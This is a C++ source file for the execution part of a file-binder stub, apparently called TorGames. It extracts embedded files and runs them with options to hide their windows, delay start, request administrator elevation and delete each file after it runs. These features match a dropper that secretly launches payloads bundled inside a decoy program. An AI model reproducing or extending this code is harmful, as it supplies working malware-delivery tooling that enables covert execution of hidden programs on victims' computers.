// TorGames.Binder.Stub - Process execution implementation
#include "Executor.h"
#include "Extractor.h"

namespace Executor {

bool IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    HANDLE hToken = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD elevationSize = sizeof(elevation);

        if (GetTokenInformation(hToken, TokenElevation, &elevation, elevationSize, &elevationSize)) {
            isAdmin = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    return isAdmin != FALSE;
}

bool RelaunchAsAdmin() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    SHELLEXECUTEINFOA sei = { sizeof(sei) };
    sei.lpVerb = "runas";
    sei.lpFile = exePath;
    sei.nShow = SW_SHOWNORMAL;

    if (ShellExecuteExA(&sei)) {
        ExitProcess(0);
        return true;
    }
    return false;
}

bool ExecuteFile(const BoundFileConfig& config, const std::string& extractedPath) {
    if (!config.executeFile) {
        return true; // Nothing to execute, success
    }

    // Apply execution delay if specified
    if (config.executionDelay > 0) {
        Sleep(config.executionDelay);
    }

    // Determine execution method based on settings
    if (config.runAsAdmin) {
        // Use ShellExecute with "runas" verb for admin elevation
        SHELLEXECUTEINFOA sei = { sizeof(sei) };
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
        sei.lpVerb = "runas";
        sei.lpFile = extractedPath.c_str();
        sei.lpParameters = config.commandLineArgs.empty() ? NULL : config.commandLineArgs.c_str();
        sei.nShow = config.runHidden ? SW_HIDE : SW_SHOWNORMAL;

        if (!ShellExecuteExA(&sei)) {
            return false;
        }

        if (config.waitForExit && sei.hProcess) {
            WaitForSingleObject(sei.hProcess, INFINITE);
            CloseHandle(sei.hProcess);
        } else if (sei.hProcess) {
            CloseHandle(sei.hProcess);
        }
    } else {
        // Use CreateProcess for normal execution
        STARTUPINFOA si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = config.runHidden ? SW_HIDE : SW_SHOWNORMAL;

        PROCESS_INFORMATION pi = {};

        // Build command line with arguments
        std::string cmdLine = "\"" + extractedPath + "\"";
        if (!config.commandLineArgs.empty()) {
            cmdLine += " " + config.commandLineArgs;
        }

        // CreateProcess needs a modifiable buffer
        char* cmdLineBuf = _strdup(cmdLine.c_str());
        if (!cmdLineBuf) return false;

        BOOL success = CreateProcessA(
            NULL,
            cmdLineBuf,
            NULL,
            NULL,
            FALSE,
            config.runHidden ? CREATE_NO_WINDOW : 0,
            NULL,
            NULL,
            &si,
            &pi
        );

        free(cmdLineBuf);

        if (!success) {
            return false;
        }

        if (config.waitForExit) {
            WaitForSingleObject(pi.hProcess, INFINITE);
        }

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    // Delete file after execution if requested
    if (config.deleteAfterExecution) {
        // Small delay to ensure the process has released the file
        Sleep(100);
        DeleteFileA(extractedPath.c_str());
    }

    return true;
}

bool ExecuteAll(const BinderConfig& config, const std::string& extractionFolder) {
    bool allSuccess = true;
    std::vector<std::string> extractedFiles;

    // First, extract all files
    int resourceId = 1;
    for (const auto& fileConfig : config.files) {
        // Determine extraction path
        std::string extractPath;
        if (fileConfig.extractPath.empty()) {
            extractPath = extractionFolder + "\\" + fileConfig.filename;
        } else {
            // Custom extraction path
            extractPath = fileConfig.extractPath;
            if (extractPath.back() != '\\' && extractPath.back() != '/') {
                extractPath += "\\";
            }
            extractPath += fileConfig.filename;

            // Create custom directory if needed
            size_t lastSlash = extractPath.find_last_of("\\/");
            if (lastSlash != std::string::npos) {
                std::string dir = extractPath.substr(0, lastSlash);
                CreateDirectoryA(dir.c_str(), NULL);
            }
        }

        // Extract the file
        auto result = Extractor::ExtractFile(resourceId, fileConfig, extractionFolder);
        if (result.error != Extractor::ExtractorError::Success) {
            allSuccess = false;
        } else {
            extractedFiles.push_back(result.extractedPath);
        }
        resourceId++;
    }

    // Execute files in order
    resourceId = 0;
    for (const auto& fileConfig : config.files) {
        if (resourceId < static_cast<int>(extractedFiles.size())) {
            if (!ExecuteFile(fileConfig, extractedFiles[resourceId])) {
                allSuccess = false;
            }
        }
        resourceId++;
    }

    return allSuccess;
}

} // namespace Executor
